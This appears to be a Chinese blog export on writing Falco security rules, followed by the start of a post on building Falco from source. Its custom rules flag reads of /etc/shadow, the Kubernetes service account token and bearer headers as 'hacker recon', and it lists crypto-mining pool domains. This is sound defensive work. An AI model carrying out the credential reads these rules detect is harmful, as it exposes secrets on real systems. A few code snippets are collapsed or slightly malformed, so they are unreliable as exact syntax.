<h2 id="默认和本地规则文件"><a href="#默认和本地规则文件" class="headerlink" title="默认和本地规则文件"></a>默认和本地规则文件</h2><p>Falco 0.8.0版本开始，falco官方支持本地规则和默认规则文件的概念。这个在之前是使用多个-r参数来解决。在0.8.0,我们正式确定了这个规则，以方便更好的制定自己的规则。你总是可以通过更改 在<code>falco.yaml</code>中的<code>rules_file</code> 来修改默认规则文件。</p>
<p><img src="../images/pic/falco2.png"> </p>
<p>默认规则文件总是首先被读取。跟着是本地规则文件。</p>
<p>当通过rpm/debian packages安装，两个规则文件，和falco配置文件，都被打上了”config” 标签文件。意味着如果修改了的话升级/卸载都不会修改这些文件。</p>
<p><strong>默认规则文件：</strong></p>
<p>默认规则文件安装在 <code>/etc/falco/falco_rules.yaml</code>。它包含一组预定义的一组规则，被用于在各种情况下提供良好的覆盖率。目的是不修改此文件，没一个新版本会替换该文件。</p>
<p><strong>本地规则文件：</strong></p>
<p>本地规则文件安装在<code>/etc/falco/falco_rules.local.yaml</code>,除了一些注释外是空的，这个文件的目的是添加/重写/修改主要的规则文件。它不会被任何新的软件版本替代。</p>
<h2 id="默认宏"><a href="#默认宏" class="headerlink" title="默认宏"></a>默认宏</h2><p>默认的规则中定义了一些宏，这让书写规则更加容易。这些宏为一些常见场景提供了快捷方式，并且可以用于任何自定义规则。在特殊场景下，用户也可以重写宏，提供的这些默认宏也可以加入本地规则中。</p>
<p><strong>打开文件并写入：</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">- macro: open_write</span><br><span class="line">  condition: (evt.<span class="attribute">type</span>=open <span class="keyword">or</span> evt.<span class="attribute">type</span>=openat) <span class="keyword">and</span> evt.<span class="attribute">is_open_write</span>=<span class="literal">true</span> <span class="keyword">and</span> fd.<span class="attribute">typechar</span>=<span class="string">&#x27;f&#x27;</span> <span class="keyword">and</span> fd.num&gt;=0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>打开文件并读：</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">- macro: open_read</span><br><span class="line">  condition: (evt.<span class="attribute">type</span>=open <span class="keyword">or</span> evt.<span class="attribute">type</span>=openat) <span class="keyword">and</span> evt.<span class="attribute">is_open_read</span>=<span class="literal">true</span> <span class="keyword">and</span> fd.<span class="attribute">typechar</span>=<span class="string">&#x27;f&#x27;</span> <span class="keyword">and</span> fd.num&gt;=0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>所有事件都过滤:</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">never_true</span></span></span><br><span class="line">  <span class="symbol">condition:</span> (evt.num=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>所有事件都不过滤：</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">always_true</span></span></span><br><span class="line">  <span class="symbol">condition:</span> (evt.num=&gt;<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>设置进程名：</strong></p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">- <span class="meta">macro</span>: proc_name_exists</span><br><span class="line"><span class="symbol">  condition:</span> (<span class="meta">proc</span>.name!=<span class="string">&quot;&lt;NA&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>文件系统对象重命名：</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">rename</span></span></span><br><span class="line">  <span class="symbol">condition:</span> evt.<span class="keyword">type</span> in (rename, renameat)</span><br></pre></td></tr></table></figure>

<p><strong>创建目录：</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">mkdir</span></span></span><br><span class="line">  <span class="symbol">condition:</span> evt.<span class="keyword">type</span> = mkdir</span><br></pre></td></tr></table></figure>

<p><strong>文件系统对象删除：</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">remove</span></span></span><br><span class="line">  <span class="symbol">condition:</span> evt.<span class="keyword">type</span> in (rmdir, unlink, unlinkat)</span><br></pre></td></tr></table></figure>

<p><strong>文件系统对象修改：</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">modify</span></span></span><br><span class="line">  <span class="symbol">condition:</span> rename or remove</span><br></pre></td></tr></table></figure>

<p><strong>派生新的进程：</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">spawned_process</span></span></span><br><span class="line">  <span class="symbol">condition:</span> evt.<span class="keyword">type</span> = execve and evt.dir=&lt;</span><br></pre></td></tr></table></figure>

<p><strong>一般的二进制文件目录：</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">- macro: bin_dir</span><br><span class="line">  condition: fd.directory <span class="keyword">in</span> (<span class="regexp">/bin, /</span>sbin, <span class="regexp">/usr/</span>bin, <span class="regexp">/usr/</span>sbin)</span><br></pre></td></tr></table></figure>

<p><strong>启动了shell:</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">shell_procs</span></span></span><br><span class="line">  <span class="symbol">condition:</span> (proc.name in (shell_binaries))</span><br></pre></td></tr></table></figure>

<p><strong>敏感文件：</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">sensitive_files</span></span></span><br><span class="line">  <span class="symbol">condition:</span> &gt;</span><br><span class="line">    fd.name startswith /etc and</span><br><span class="line">    (fd.name in (sensitive_file_names)</span><br><span class="line">     or fd.directory in (<span class="regexp">/etc/sudoers</span>.d, <span class="regexp">/etc/pam</span>.d))</span><br></pre></td></tr></table></figure>

<p><strong>创建新的进程：</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">proc_is_new</span></span></span><br><span class="line">  <span class="symbol">condition:</span> proc.duration &lt;= <span class="number">5000000000</span></span><br></pre></td></tr></table></figure>

<p><strong>入站网络连接：</strong></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">- macro: inbound</span><br><span class="line"><span class="symbol">  condition:</span> &gt;</span><br><span class="line">    (((evt.type in (accept,listen) <span class="keyword">and </span>evt.<span class="keyword">dir=&lt;)) </span><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span>     (fd.typechar = <span class="number">4</span> <span class="keyword">or </span>fd.typechar = <span class="number">6</span>) <span class="keyword">and</span></span><br><span class="line"><span class="keyword"></span>     (fd.ip != <span class="string">&quot;0.0.0.0&quot;</span> <span class="keyword">and </span>fd.net != <span class="string">&quot;127.0.0.0/8&quot;</span>) <span class="keyword">and </span>(evt.rawres &gt;= <span class="number">0</span> <span class="keyword">or </span>evt.res = <span class="keyword">EINPROGRESS))</span></span><br></pre></td></tr></table></figure>

<p><strong>出站网络连接：</strong></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">- macro: outbound  condition: &gt;    (((evt.type = connect <span class="keyword">and </span>evt.<span class="keyword">dir=&lt;)) </span><span class="keyword">or </span>    (fd.typechar = <span class="number">4</span> <span class="keyword">or </span>fd.typechar = <span class="number">6</span>) <span class="keyword">and </span>    (fd.ip != <span class="string">&quot;0.0.0.0&quot;</span> <span class="keyword">and </span>fd.net != <span class="string">&quot;127.0.0.0/8&quot;</span>) <span class="keyword">and </span>(evt.rawres &gt;= <span class="number">0</span> <span class="keyword">or </span>evt.res = <span class="keyword">EINPROGRESS))</span></span><br></pre></td></tr></table></figure>

<p><strong>出站或者入站网络连接：</strong></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">- macro: inbound_outbound  condition: &gt;    (((evt.type in (accept,listen,connect) <span class="keyword">and </span>evt.<span class="keyword">dir=&lt;)) </span><span class="keyword">or </span>    (fd.typechar = <span class="number">4</span> <span class="keyword">or </span>fd.typechar = <span class="number">6</span>) <span class="keyword">and </span>    (fd.ip != <span class="string">&quot;0.0.0.0&quot;</span> <span class="keyword">and </span>fd.net != <span class="string">&quot;127.0.0.0/8&quot;</span>) <span class="keyword">and </span>(evt.rawres &gt;= <span class="number">0</span> <span class="keyword">or </span>evt.res = <span class="keyword">EINPROGRESS))</span></span><br></pre></td></tr></table></figure>

<p><strong>在容器中：</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">container</span></span>  <span class="symbol">condition:</span> container.id != host</span><br></pre></td></tr></table></figure>

<p><strong>交互式进程产生：</strong></p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">- <span class="meta">macro</span>: interactive  condition: &gt;    ((<span class="meta">proc</span>.aname<span class="symbol">=sshd</span> <span class="keyword">and</span> <span class="meta">proc</span>.name != sshd) or    <span class="meta">proc</span>.name<span class="symbol">=systemd</span>-logind or <span class="meta">proc</span>.name<span class="symbol">=login</span>)</span><br></pre></td></tr></table></figure>



<h2 id="重写宏"><a href="#重写宏" class="headerlink" title="重写宏"></a>重写宏</h2><p>上面的这些默认宏可以被重写</p>
<ul>
<li><p><strong>通常的ssh端口：</strong></p>
<p>重写这个宏改为环境变量中的ssh端口</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">ssh_port</span></span>  <span class="symbol">condition:</span> fd.sport=<span class="number">22</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>允许的主机连接：</strong></p>
<p>重写此宏以允许特定的主机连接</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">allowed_ssh_hosts</span></span>  <span class="symbol">condition:</span> ssh_port</span><br></pre></td></tr></table></figure></li>
<li><p><strong>白名单容器：</strong></p>
<p>重写允许的白名单容器</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">user_trusted_containers</span></span>  <span class="symbol">condition:</span> (container.image startswith sysdig/agent)</span><br></pre></td></tr></table></figure></li>
<li><p><strong>允许派生shell：</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">user_shell_container_exclusions</span></span>  <span class="symbol">condition:</span> (never_true)</span><br></pre></td></tr></table></figure></li>
<li><p><strong>允许与EC2元数据服务器通信的程序</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">ec2_metadata_containers</span></span>  <span class="symbol">condition:</span> container</span><br></pre></td></tr></table></figure></li>
<li><p><strong>kubernetes API Server</strong></p>
<p>设置kubernetes API Server的IP</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">- macro: k8s_api_server  condition: (fd.<span class="attribute">sip</span>=<span class="string">&quot;1.2.3.4&quot;</span> <span class="keyword">and</span> fd.<span class="attribute">sport</span>=8080)</span><br></pre></td></tr></table></figure></li>
<li><p><strong>允许与Kubernetes API Server通信的容器</strong></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">- macro: k8s_containers  <span class="keyword">condition</span>: &gt;    (<span class="keyword">container</span>.<span class="keyword">image</span> startswith gcr.io/google_containers/hyperkube-amd64 or    <span class="keyword">container</span>.<span class="keyword">image</span> startswith gcr.io/google_containers/kube2sky or    <span class="keyword">container</span>.<span class="keyword">image</span> startswith sysdig/agent or    <span class="keyword">container</span>.<span class="keyword">image</span> startswith sysdig/falco or    <span class="keyword">container</span>.<span class="keyword">image</span> startswith sysdig/sysdig)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p><strong>允许Kubernetes Service NodePorts通信的容器</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">nodeport_containers</span></span>  <span class="symbol">condition:</span> container</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="fd-sip-name"><a href="#fd-sip-name" class="headerlink" title="fd.sip.name"></a>fd.sip.name</h2><p>这部分讲解怎样使用fd.sip.name字段，和相关的fd.{clr}ip.name字段，例如。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">list:</span> <span class="string">https_miner_domains</span></span><br><span class="line">  <span class="attr">items:</span> [</span><br><span class="line">    <span class="string">&quot;ca.minexmr.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cn.stratum.slushpool.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;de.minexmr.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fr.minexmr.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mine.moneropool.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mine.xmrpool.net&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pool.minexmr.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sg.minexmr.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stratum-eth.antpool.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stratum-ltc.antpool.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stratum-zec.antpool.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stratum.antpool.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xmr.crypto-pool.fr&quot;</span></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add rule based on crypto mining IOCs</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">macro:</span> <span class="string">minerpool_https</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">(fd.sport=&quot;443&quot;</span> <span class="string">and</span> <span class="string">fd.sip.name</span> <span class="string">in</span> <span class="string">(https_miner_domains))</span></span><br></pre></td></tr></table></figure>

<p>这个 fd.sip.name字段和相关的 fd.{clr}ip.name字段，与falco的规则有所不同，</p>
<p><strong>首先解析域名，然后匹配IP：</strong></p>
<p>当一个规则包含一个字段<code>fd.*ip.name</code>，比较的域名中，在右侧域名保存在falco引擎的内部 (The <code>foo.com</code> in <code>=foo.com or in (foo.com, bar.com)</code>)。引擎立即查找这些域名的A记录并内部保存这些IP。这种行为可以防止在系统调用时停止执行，来做耗时的DNS查询。</p>
<p>之后，当一个系统调用事件根过滤器匹配的时候，系统调用事件的实际ip（服务端ip是<code>fd.sip.name</code>,客户端ip是<code>fd.cip.name</code>，等等）会与之前DNS查询的一组进行对比，实际的IP与解析的IP进行比较。基于比较的运算（=/!=/in, perhaps with a preceding not, etc）得到一个true/false的结果。</p>
<p>这里有个例子，如果一个规则包含一个断言， <code>evt.type=connect and fd.sip.name=yahoo.com</code>，当规则加载的时候，引擎解析域名<code>yahoo.com</code>到一个ip集(say 1.2.3.4, 1.2.3.5, 1.2.3.6)。之后，如果一个网络连接事实产生(say to 1.2.3.5)，引擎会拿着这个ip和之前存储的ip集做比较，发现1.2.3.5属于yahoo.com的ip集，规则片段解析为true。</p>
<p>右边的断言可以是<code>in</code>，例如 <code>fd.sip.name in (yahoo.com, foo.com)</code>。在这种情况中，会解析并保留两个域名的规则集，之后的系统调用获取的ip会与两组域名的 ip集进行比较。</p>
<p><strong>Falco引擎如何刷新Domain/IP的映射</strong></p>
<p>域名的查询实际是在另一进程中，避免主系统调用持续暂停。另外的，实际上这一组ip是以下规则持续更新的，</p>
<ul>
<li>域名十秒刷新一次</li>
<li>如果在刷新之后没有改变，域名刷新超时变成两倍直到320秒（约5分钟）</li>
</ul>
<p>*<em>与fd.<em>ip.name字段有关的告警</em></em></p>
<p>当编写Falco规则的时候，需要注意与 <code>fd.*ip.name</code> 关联的告警。</p>
<p>右边必须是一个可解析的域名：</p>
<p>右边的断言（the <code>foo.com</code> part of <code>fd.sip.name=foo.com</code>)，在规则加载的时候进行DNS查询，它必须是一个可解析的域名，因此，它不可能使用域名的子字符串进行运算，比如e.g. <code>fd.sip.name contains company.com</code>.，因此，falco engine必须返回一个准确结果。</p>
<p>*<em>在输出中使用fd.<em>ip.name字段</em></em></p>
<p>这个字段 <code>fd.*ip.name</code> 在输出中使用，但是只有在事件中的ip与ip集中的ip匹配的时候才有用。例如，接下来的规则会显示有意义的输出， <code>...IP=%fd.sip.name</code>，</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">rule</span>: <span class="keyword">Connect</span> <span class="keyword">to</span> Yahoo</span><br><span class="line">  <span class="keyword">desc</span>: Detect Connects <span class="keyword">to</span> yahoo.com IPs</span><br><span class="line">  condition: evt.<span class="keyword">type</span>=<span class="keyword">connect</span> <span class="keyword">and</span> fd.sip.name=yahoo.com</span><br><span class="line">  output: <span class="keyword">Some</span> <span class="keyword">connect</span> <span class="keyword">to</span> yahoo (command=%proc.cmdline <span class="keyword">connection</span>=%fd.name IP=%fd.sip.name)</span><br><span class="line">  priority: <span class="keyword">INFO</span></span><br></pre></td></tr></table></figure>



<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">rule</span>: <span class="keyword">Connect</span> <span class="keyword">to</span> Anything but Yahoo</span><br><span class="line">  <span class="keyword">desc</span>: Detect Connects <span class="keyword">to</span> anything other than yahoo.com IPs</span><br><span class="line">  condition: evt.<span class="keyword">type</span>=<span class="keyword">connect</span> <span class="keyword">and</span> fd.sip.name!=yahoo.com</span><br><span class="line">  output: <span class="keyword">Some</span> <span class="keyword">connect</span> <span class="keyword">to</span> something other than yahoo (command=%proc.cmdline <span class="keyword">connection</span>=%fd.name IP=%fd.sip.name)</span><br><span class="line">  priority: <span class="keyword">INFO</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>如上规则，如果连接1.5.6.7。 IPs 1.2.3.4/1.2.3.5/1.2.3.6。就会生成告警。</p>
<p><strong>有限的比较运算符</strong></p>
<p>虽然falco支持各种运算符，但是fd.*ip.name只支持 =/!=/in。</p>
<h2 id="例外的规则"><a href="#例外的规则" class="headerlink" title="例外的规则"></a>例外的规则</h2><p>Starting in 0.28.0，可添加 <code>exceptions</code>到规则里面。</p>
<p>例如</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">Write</span> <span class="string">below</span> <span class="string">binary</span> <span class="string">dir</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">an</span> <span class="string">attempt</span> <span class="string">to</span> <span class="string">write</span> <span class="string">to</span> <span class="string">any</span> <span class="string">file</span> <span class="string">below</span> <span class="string">a</span> <span class="string">set</span> <span class="string">of</span> <span class="string">binary</span> <span class="string">directories</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">&gt;</span></span><br><span class="line"><span class="string">    bin_dir and evt.dir = &lt; and open_write</span></span><br><span class="line"><span class="string">    and not package_mgmt_procs</span></span><br><span class="line"><span class="string">    and not exe_running_docker_save</span></span><br><span class="line"><span class="string">    and not python_running_get_pip</span></span><br><span class="line"><span class="string">    and not python_running_ms_oms</span></span><br><span class="line"><span class="string">    and not user_known_write_below_binary_dir_activities</span></span><br><span class="line"><span class="string"></span>  <span class="attr">exceptions:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc_writer</span></span><br><span class="line">     <span class="attr">fields:</span> [<span class="string">proc.name</span>, <span class="string">fd.directory</span>]</span><br><span class="line">     <span class="attr">comps:</span> [<span class="string">=</span>, <span class="string">=</span>]</span><br><span class="line">     <span class="attr">values:</span></span><br><span class="line">       <span class="bullet">-</span> [<span class="string">my-custom-yum</span>, <span class="string">/usr/bin</span>]</span><br><span class="line">       <span class="bullet">-</span> [<span class="string">my-custom-apt</span>, <span class="string">/usr/local/bin</span>]</span><br><span class="line">   <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cmdline_writer</span></span><br><span class="line">     <span class="attr">fields:</span> [<span class="string">proc.cmdline</span>, <span class="string">fd.directory</span>]</span><br><span class="line">     <span class="attr">comps:</span> [<span class="string">startswith</span>, <span class="string">=</span>]</span><br><span class="line">   <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">container_writer</span></span><br><span class="line">     <span class="attr">fields:</span> [<span class="string">container.image.repository</span>, <span class="string">fd.directory</span>]</span><br><span class="line">   <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc_filenames</span></span><br><span class="line">     <span class="attr">fields:</span> [<span class="string">proc.name</span>, <span class="string">fd.name</span>]</span><br><span class="line">     <span class="attr">comps:</span> [<span class="string">=</span>, <span class="string">in</span>]</span><br><span class="line">     <span class="attr">values:</span></span><br><span class="line">       <span class="bullet">-</span> [<span class="string">my-custom-dpkg</span>, [<span class="string">/usr/bin</span>, <span class="string">/bin</span>]]</span><br><span class="line">   <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">filenames</span></span><br><span class="line">     <span class="attr">fields:</span> <span class="string">fd.filename</span></span><br><span class="line">     <span class="attr">comps:</span> <span class="string">in</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这条规则定义了四条的例外。</p>
<ul>
<li>proc_writer: uses a combination of proc.name and fd.directory</li>
<li>cmdline_writer： uses a combination of proc.cmeline and fd.directory</li>
<li>container_writer: uses a combination of container.image.repository and fd.directory</li>
<li>proc_filenames: uses a combination of process and list of filenames.</li>
<li>filenames: uses a list of filenames</li>
</ul>
<p>这些字符串”proc_writer”/“container_writer”/“proc_filenames”/“filenames” 。</p>
<h2 id="自己编写的规则"><a href="#自己编写的规则" class="headerlink" title="自己编写的规则"></a>自己编写的规则</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">- macro: consider_all_outbound_conns</span><br><span class="line">  condition: (always_true)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- macro: consider_all_inbound_conns</span><br><span class="line">  condition: (always_true)</span><br><span class="line"></span><br><span class="line">- rule: open_file</span><br><span class="line">  desc: open file</span><br><span class="line">  condition: &gt;</span><br><span class="line">    open_write <span class="keyword">or</span> open_read</span><br><span class="line">  output: &gt;</span><br><span class="line">    event create (<span class="attribute">user</span>=%user.name <span class="attribute">user_loginuid</span>=%user.loginuid <span class="attribute">program</span>=%proc.name</span><br><span class="line">    <span class="attribute">command</span>=%proc.cmdline <span class="attribute">parent</span>=%proc.pname <span class="attribute">gparent</span>=%proc.aname[2] <span class="attribute">ggparent</span>=%proc.aname[3] <span class="attribute">container_id</span>=%container.id <span class="attribute">image</span>=%container.image.repository)</span><br><span class="line">  priority: <span class="builtin-name">INFO</span></span><br><span class="line">  tags: [file]</span><br><span class="line"></span><br><span class="line">- rule: event_create</span><br><span class="line">  desc: create event</span><br><span class="line">  condition: &gt;</span><br><span class="line">    evt.type = open <span class="keyword">or</span> evt.type = openat</span><br><span class="line">  output: &gt;</span><br><span class="line">    event create (<span class="attribute">user</span>=%user.name <span class="attribute">user_loginuid</span>=%user.loginuid <span class="attribute">proc_id</span>=%proc.pid <span class="attribute">program</span>=%proc.name <span class="attribute">command</span>=%proc.cmdline <span class="attribute">gproc_id</span>=%proc.ppid <span class="attribute">parent</span>=%proc.pname <span class="attribute">gparent</span>=%proc.aname[2] <span class="attribute">ggparent</span>=%proc.aname[3] <span class="attribute">container_id</span>=%container.id <span class="attribute">image</span>=%container.image.repository)</span><br><span class="line">  priority: <span class="builtin-name">INFO</span></span><br><span class="line">  tags: [event]</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">- list: sensitive_for_cat</span><br><span class="line">  items: [/etc/shadow, /etc/passwd, /etc/sudoers, /etc/pam.conf, /etc/security/pwquality.conf]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- rule: cat sensitive_file</span><br><span class="line">  desc: cat sensitive file</span><br><span class="line">  condition: open_read <span class="keyword">and</span> (fd.name <span class="keyword">in</span> (sensitive_for_cat)) <span class="keyword">and</span> proc.<span class="attribute">name</span>=<span class="string">&quot;cat&quot;</span></span><br><span class="line">  output: &gt;</span><br><span class="line">    hacker recon (<span class="attribute">user</span>=%user.name <span class="attribute">user_loginuid</span>=%user.loginuid</span><br><span class="line">    <span class="attribute">command</span>=%proc.cmdline <span class="attribute">program</span>=%proc.name <span class="attribute">parent</span>=%proc.pname <span class="attribute">file</span>=%fd.name <span class="attribute">gparent</span>=%proc.aname[2] <span class="attribute">container_id</span>=%container.id <span class="attribute">image</span>=%container.image.repository)</span><br><span class="line">  priority: <span class="builtin-name">WARNING</span></span><br><span class="line">  tags: [filesystem]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- rule: hacker_recon</span><br><span class="line">  desc: hacker_recon</span><br><span class="line">  condition: &gt;</span><br><span class="line">    proc.name = <span class="string">&quot;fdisk&quot;</span> </span><br><span class="line">    <span class="keyword">or</span> (proc.<span class="attribute">args</span>=<span class="string">&quot;/proc/1/cgroup&quot;</span>) </span><br><span class="line">    <span class="keyword">or</span> (proc.<span class="attribute">args</span>=<span class="string">&quot;/proc/self/mounts&quot;</span>) </span><br><span class="line">    <span class="keyword">or</span> (proc.<span class="attribute">args</span>=<span class="string">&quot;/var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span>)</span><br><span class="line">    <span class="keyword">or</span> (proc.args contains <span class="string">&quot;Authorization: Bearer&quot;</span>)</span><br><span class="line">    <span class="keyword">or</span> (proc.cmdline contains <span class="string">&quot;kubectl proxy&quot;</span>)</span><br><span class="line">  output: &gt;</span><br><span class="line">    hacker recon (<span class="attribute">user</span>=%user.name <span class="attribute">user_loginuid</span>=%user.loginuid</span><br><span class="line">    <span class="attribute">command</span>=%proc.cmdline <span class="attribute">program</span>=%proc.name <span class="attribute">args</span>=%proc.args <span class="attribute">parent</span>=%proc.pname <span class="attribute">file</span>=%fd.name <span class="attribute">gparent</span>=%proc.aname[2] <span class="attribute">container_id</span>=%container.id <span class="attribute">image</span>=%container.image.repository)</span><br><span class="line">  priority: <span class="builtin-name">INFO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- list: shell_binaries</span><br><span class="line">  append: <span class="literal">true</span></span><br><span class="line">  items: [python]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>云原生安全</tag>
        <tag>Linux安全</tag>
        <tag>K8s</tag>
      </tags>
  </entry>
  <entry>
    <title>falco源码编译及部署</title>
    <url>/falco%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%8F%8A%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<p>源码编译falco以及falco内核模块，使其在debian或者alpine基础镜像中运行，alpine打包出来的镜像低于30M。官方的falco镜像差不多1G大小。</p>
<span id="more"></span>

<h2 id="1-编译安装"><a href="#1-编译安装" class="headerlink" title="1. 编译安装"></a>1. 编译安装</h2><p>安装kernel module driver</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">#centos</span><br><span class="line">yum -y install kernel-devel-<span class="constructor">$(<span class="params">uname</span> -<span class="params">r</span>)</span></span><br><span class="line"></span><br><span class="line">#Debian</span><br><span class="line">apt install linux-headers-<span class="constructor">$(<span class="params">uname</span> -<span class="params">r</span>)</span></span><br></pre></td></tr></table></figure>

<p>运行构建镜像(这里使用宿主机的代理，方便下载国外的工具)</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> --name falcobuild -itd -v /lib/modules:/lib/modules <span class="attribute">--network</span>=host falcosecurity/falco-builder bash</span><br><span class="line"><span class="comment">#进入容器开启代理</span></span><br><span class="line">docker exec -it falcobuild bash</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">ALL_PROXY</span>=<span class="string">&#x27;socks5://172.16.42.1:1086&#x27;</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">all_proxy</span>=http://172.16.42.1:1087</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主机上下载</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/falcosecurity/</span>falco.git</span><br><span class="line"><span class="comment">#复制到容器</span></span><br><span class="line">docker cp falco falcobuild:<span class="regexp">/root/</span></span><br></pre></td></tr></table></figure>

<p>容器里编译</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">mkdir build &amp;&amp; cd build</span><br><span class="line"></span><br><span class="line"><span class="comment">#debian/centos容器</span></span><br><span class="line">cmake <span class="attribute">-DUSE_BUNDLED_DEPS</span>=<span class="literal">true</span> <span class="attribute">-DCREATE_TEST_TARGETS</span>=OFF <span class="built_in">..</span>/</span><br><span class="line"><span class="comment">#alpine容器</span></span><br><span class="line">cmake <span class="attribute">-DUSE_BUNDLED_DEPS</span>=<span class="literal">true</span> <span class="attribute">-DCREATE_TEST_TARGETS</span>=OFF <span class="attribute">-DMUSL_OPTIMIZED_BUILD</span>=On <span class="built_in">..</span>/</span><br><span class="line"></span><br><span class="line">make sinsp</span><br><span class="line">make driver</span><br><span class="line">make falco</span><br><span class="line">make falco_engine</span><br></pre></td></tr></table></figure>

<p>将容器里编译好的复制出来运行</p>
